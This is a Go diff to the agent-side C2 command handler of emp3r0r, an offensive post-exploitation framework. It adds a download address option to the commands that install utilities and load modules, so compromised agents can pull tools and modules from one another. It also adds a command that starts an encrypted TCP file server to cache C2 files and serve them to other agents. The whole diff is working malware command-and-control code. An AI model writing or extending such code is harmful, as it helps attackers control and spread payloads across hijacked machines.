@@ -229,16 +229,17 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !utils
-	// Usage: !utils --checksum <checksum>
+	// Usage: !utils --checksum <checksum> --download_addr <download_address>
 	// Executes utility functions on the agent.
 	case emp3r0r_data.C2CmdUtils:
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
+		download_addr := flags.StringP("download_addr", "d", "", "Download address from other agents")
 		flags.Parse(cmdSlice[1:])
-		if *checksum != "" {
+		if *checksum == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
-		out = VaccineHandler(*checksum)
+		out = VaccineHandler(*download_addr, *checksum)
 		if out != "[+] Utils have been successfully installed" {
 			out = fmt.Sprintf("Error: %s", out)
 		}
@@ -252,12 +253,13 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		inMem := flags.BoolP("in_mem", "i", false, "Load module in memory")
 		startscript_checksum := flags.StringP("startscript_checksum", "s", "", "Start script checksum")
+		download_addr := flags.StringP("download_addr", "d", "", "Download address from other agents")
 		flags.Parse(cmdSlice[1:])
 		if *modName == "" || *checksum == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
-		out = moduleHandler(*modName, *checksum, *startscript_checksum, *inMem)
+		out = moduleHandler(*download_addr, *modName, *checksum, *startscript_checksum, *inMem)
 		return
 
 	// !upgrade_agent --checksum checksum
@@ -310,6 +312,32 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = "Listener started successfully"
 		}
 		return
+
+	// !file_server --port port
+	// this will start a TCP file server with AES_GCM, clients can request arbitrary files at specified offset
+	// when this server runs, it will cache files from C2, so that we can serve files to agents
+	case emp3r0r_data.C2CmdFileServer:
+		port := flags.StringP("port", "p", "8000", "Port")
+		server_switch := flags.StringP("switch", "s", "on", "Switch")
+		flags.Parse(cmdSlice[1:])
+		portInt, err := strconv.Atoi(*port)
+		if err != nil {
+			out = fmt.Sprintf("Error parsing port: %v", err)
+			return
+		}
+		if *server_switch == "on" {
+			out = fmt.Sprintf("File server on port %s is now %s", *port, *server_switch)
+			if FileServerCtx != nil {
+				FileServerCancel()
+			}
+			FileServerCtx, FileServerCancel = context.WithCancel(context.Background())
+			go FileServer(portInt, FileServerCtx, FileServerCancel)
+		} else {
+			if FileServerCtx != nil {
+				FileServerCancel()
+			}
+			out = fmt.Sprintf("File server on port %s is now %s", *port, *server_switch)
+		}
 
 	default:
 		// let per-platform C2CommandsHandler do the job
